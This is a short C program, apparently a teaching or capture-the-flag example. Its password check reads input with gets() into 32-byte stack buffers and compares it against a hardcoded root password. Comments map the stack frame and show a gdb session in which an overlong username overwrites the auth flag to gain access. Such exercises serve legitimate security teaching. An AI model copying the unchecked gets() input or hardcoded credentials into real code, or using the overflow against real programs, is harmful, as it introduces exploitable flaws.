/*
 * Copyright (c) 2017, Stephen Warren
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 */

#include <stdio.h>
#include <string.h>

#define USER "root"
#define PASS "hSWo,yWfQ6js*r~D"

int check_authorization(void) {
    int auth = 0;
    char user[32];
    char pass[32];

    printf("username: ");
    fflush(stdout);
    gets(user);

    printf("password: ");
    fflush(stdout);
    gets(pass);

    if (!strcmp(user, USER) && !strcmp(pass, PASS))
        auth = 1;

    return auth;
}

int main(int argc, char **argv) {
    if (check_authorization())
        printf("You're in\n");
    else
        printf("ACCESS DENIED!\n");

    return 0;
}

/*
check_authorization() stack frame:
var     offset size
auth        76    4
pad         64   12
user[]      32   32
pass[]       0   32  <-- stack pointer
*/

/*
$ gdb ./stack-var-flag
(gdb) b 12
(gdb) r
(gdb) p &user
$1 = (char (*)[32]) 0x7fffffffe0d0
(gdb) p &pass
$2 = (char (*)[32]) 0x7fffffffe0b0
(gdb) p &auth
$3 = (int *) 0x7fffffffe0fc
(gdb) c
Continuing.
username: 012345678901234567890123456789010123456789ab1
(32 chars for user[], 12 chars to reach &auth, 1 char to fill auth)
password: pass
You're in
*/
